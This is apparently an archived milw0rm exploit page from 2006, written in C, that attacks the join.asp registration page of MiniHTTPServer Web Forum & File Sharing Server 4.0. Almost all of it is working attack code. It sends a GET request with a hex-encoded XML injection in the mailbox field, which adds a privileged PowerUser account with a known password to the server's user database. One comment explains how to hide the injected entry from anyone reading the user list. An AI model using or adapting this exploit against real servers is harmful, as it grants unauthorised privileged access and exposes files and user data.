<html><head><title>MiniHttpServer Web Forum & File Sharing Server 4.0 Add User Exploit</title></head><pre>/*================================================================

MiniHTTPServer.NET 's Web Forum &amp; File Sharing Server Power Pack 4
(latest version available for sale on their website
http://www.minihttpserver.net/bbs/index.php ) has multiple
vulnerabilities with their join.asp page a malicious person could send manipulated data
within the 'FrmMailBox' or 'FrmUserPass' field to add an unverified
account to the system's user database or to manipulate existing users.

This obviously could lead to information leaks on the server,
sensitive information disclosure, or even system access and
compromise.

Discovered 10-25-2006 by Greg Linares
Compiled in LCC-Win32

==================================================================*/



#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#pragma comment(lib, &quot;ws2_32&quot;)

#define MAXBUF  1024

int main(int argc, char *argv[])
{
	/* make sure this lowercase only username here is unique to the server - else exploit fails */

	unsigned char ExploitStart[] =
	&quot;/join.asp?frmUserID=uniquerandomusername&amp;frmUserPass=pwd1234&amp;frmMailBox=me@blah.net&quot;;




	unsigned char Exploit[] =
	&quot;\x3c\x2f\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e\x3c&quot;
	&quot;\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x31\x32\x33\x34&quot;
	&quot;\x3c\x2f\x50\x61\x73\x73\x77\x6f\x72\x64\x3e\x3c&quot;
	&quot;\x41\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e&quot;
	&quot;\x50\x6f\x77\x65\x72\x55\x73\x65\x72\x3c\x2f\x41&quot;
	&quot;\x63\x63\x65\x73\x73\x72\x69\x67\x68\x74\x3e\x3c&quot;
	&quot;\x45\x6d\x61\x69\x6c\x3e\x61\x40\x68\x65\x72\x65&quot;
	&quot;\x2e\x6e\x65\x74&quot;;

	WSADATA wsaData;
	char *hostname;
	struct hostent *hp;
	int sockfd, bytes_read;
	struct sockaddr_in sockin;
    char buffer[MAXBUF];
	char Exp[MAXBUF];

	printf(&quot;\n=================================================================================\n&quot;);
	printf(&quot;0-day MiniHTTPServer Web Forum &amp; File Sharing Server 4.0 Add PowerUser Vulnerability \n&quot;);
	printf(&quot;Proof Of Concept Code and Discovery by Greg Linares &lt;GLinares.Code [At] GMail [Dot] Com\n&quot;);
	printf(&quot;Exploits: invalid user-input on join.asp Membership Join Page\n&quot;);
	printf(&quot;Adds a PowerUser - which has full read/write to Level Medium - Low Shares and Forum Editing\n&quot;);
	printf(&quot;and still able to read all files on High Level shares.\n&quot;);
	printf(&quot;Reported: Wednesday October 25th 2006\n&quot;);
	printf(&quot;=================================================================================\n&quot;);

    if ( argc != 3 )
	{
    	printf(&quot;usage: %s &lt;IP-addr or hostname&gt; &lt;username to add&gt;\n&quot;, argv[0]);
		exit(0);
	}


	hostname = argv[1];
	if (WSAStartup(MAKEWORD(1, 1), &amp;wsaData) &lt; 0)
   	{
    	fprintf(stderr, &quot;Error setting up with WinSock v1.1\n&quot;);
      	exit(-1);
   	}



	hp = gethostbyname(hostname);
   	if (hp == NULL)
   	{
      	printf(&quot;ERROR: Uknown host %s\n&quot;, hostname);
	  	printf(&quot;%s&quot;,hostname);
      	exit(-1);
   	}

   	sockin.sin_family = AF_INET;
   	sockin.sin_port = htons(80);
   	sockin.sin_addr = *((struct in_addr *)hp-&gt;h_addr);

   	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == SOCKET_ERROR)
   	{
      	printf(&quot;ERROR: Socket Error\n&quot;);
      	exit(-1);
   	}

   	if ((connect(sockfd, (struct sockaddr *) &amp;sockin,
                sizeof(sockin))) == SOCKET_ERROR)
   	{
      	printf(&quot;ERROR: Connect Error\n&quot;);
      	closesocket(sockfd);
      	WSACleanup();
      	exit(-1);
   	}

   	printf(&quot;Connected to [%s] on port [80], sending overflow....\n\n\n&quot;,
          hostname);



	memset(Exp, 0, 1024);
	strcat(Exp, ExploitStart);
	/* you can add more \r to create blank lines in the userlist (harder to read) */
	strcat(Exp, &quot;\r&quot;);
	strcat(Exp, &quot;\x3c\x55\x73\x65\x72\x6e\x61\x6d\x65\x3e&quot;);
   	strcat(Exp, strlwr(argv[2]));
	strcat(Exp, Exploit);


	memset(buffer, 0, 1024);
    sprintf(buffer, &quot;GET %s HTTP/1.0\n\n&quot;, Exp);
    send(sockfd, buffer, strlen(buffer), 0);

	/*
	You can re-add this if you want to see the HTTP Response
    do
    {

        bytes_read = recv(sockfd, buffer, sizeof(buffer), 0);
        if ( bytes_read &gt; 0 )
            printf(&quot;%s&quot;, buffer);
    }
    while ( bytes_read &gt; 0 );
	*/

	printf(&quot;Exploit Sent to [%s] \n Login with Username: %s (lowercase) \n Password: 1234\n&quot;, hostname, strlwr(argv[2]));
	printf(&quot;Any Questions/Comments/Concerns ==&gt; GLinares.Code [at] Gmail [dot] com\n&quot;);
	WSACleanup();
    return 0;
}

// milw0rm.com [2006-10-25]</pre></html>